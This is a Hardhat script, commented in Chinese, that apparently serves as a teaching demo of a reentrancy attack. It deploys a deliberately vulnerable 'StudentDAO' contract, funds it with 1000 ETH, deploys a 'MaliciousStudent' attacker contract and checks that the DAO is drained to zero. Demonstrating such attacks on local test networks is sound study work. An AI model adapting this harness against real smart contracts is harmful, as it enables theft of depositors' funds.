import { ethers } from "hardhat";

async function main() {
  const [deployer, innocentStudent, hacker] = await ethers.getSigners();

  console.log(" step 1: 部署合約");
  
  const StudentDAO = await ethers.getContractFactory("StudentDAO");
  const dao = await StudentDAO.deploy();
  await dao.waitForDeployment();
  const daoAddress = await dao.getAddress();
  console.log(`StudentDAO 部署於: ${daoAddress}`);

  console.log(" step 2: 好學生存入資金 ");
  await dao.connect(innocentStudent).deposit({ value: ethers.parseEther("1000.0") });
  console.log(`DAO 當前餘額: ${ethers.formatEther(await dao.getBalance())} ETH`);

  console.log(" step3:  駭客準備攻擊");
  const MaliciousStudent = await ethers.getContractFactory("MaliciousStudent");
  const malicious = await MaliciousStudent.connect(hacker).deploy(daoAddress);
  await malicious.waitForDeployment();
  console.log("駭客合約已部署");

  console.log("\n step 4 :執行重入攻擊 (Reentrancy Attack) ");
  console.log("駭客存入 1 ETH 並立即觸發攻擊...");
  // try-catch 以防萬一報錯 才看得到詳細資訊
  try {
      await malicious.connect(hacker).attack({ value: ethers.parseEther("1.0") });
  } catch (error) {
      console.log("攻擊過程中發生錯誤 (不應該發生在有漏洞的版本):", error);
  }

  console.log("\n step 5: 攻擊結果 ");
  const daoBalance = await dao.getBalance();
  console.log(`DAO 剩餘餘額: ${ethers.formatEther(daoBalance)} ETH (預期: 0.0)`);
  
  const hackerContractBalance = await ethers.provider.getBalance(await malicious.getAddress());
  console.log(`駭客合約餘額: ${ethers.formatEther(hackerContractBalance)} ETH (預期: > 1000.0)`);

  if (daoBalance == BigInt(0)) {
    console.log("\n 演示成功 DAO 資金已被掏空。");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});